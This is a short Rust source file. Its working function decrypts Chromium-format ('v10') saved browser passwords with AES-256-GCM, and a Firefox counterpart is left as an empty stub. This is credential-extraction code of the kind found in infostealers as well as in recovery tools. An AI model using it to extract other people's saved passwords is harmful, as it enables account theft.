use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use aes_gcm::aead::generic_array::GenericArray;
use base64::engine::general_purpose::STANDARD;
use base64::Engine;

pub fn decrypt_password(_encrypted_password: &[u8], key: *mut u8) -> String {
    if _encrypted_password.starts_with(b"v10") {
        let key_slice: &[u8] = unsafe { std::slice::from_raw_parts(key, 32) };

        let ciphertext = &_encrypted_password[b"v10".len()..];
        
        let nonce: [u8; 12] = ciphertext[..12].try_into().expect("Invalid nonce size");
        let ciphertext = &ciphertext[12..];

        let cipher = Aes256Gcm::new(GenericArray::from_slice(key_slice));
        let nonce = Nonce::from_slice(&nonce);

        match cipher.decrypt(nonce, ciphertext) {
            Ok(plaintext) => {
                let decrypted_text = std::str::from_utf8(&plaintext).expect("Invalid UTF-8");
                decrypted_text.to_string()
            }
            Err(_e) => {
                return "".to_string()
            }
        }
    } else {
        return "".to_string()
    }
}


pub fn decrypt_password_firefox(encrypted_text: &Option<String>) {
    match encrypted_text {
        Some(text) => {
            match STANDARD.decode(text) {
                Ok(_base64_text) => {
                    return
                }
                Err(_) => {}
            }
        }
        None => {}
    }
}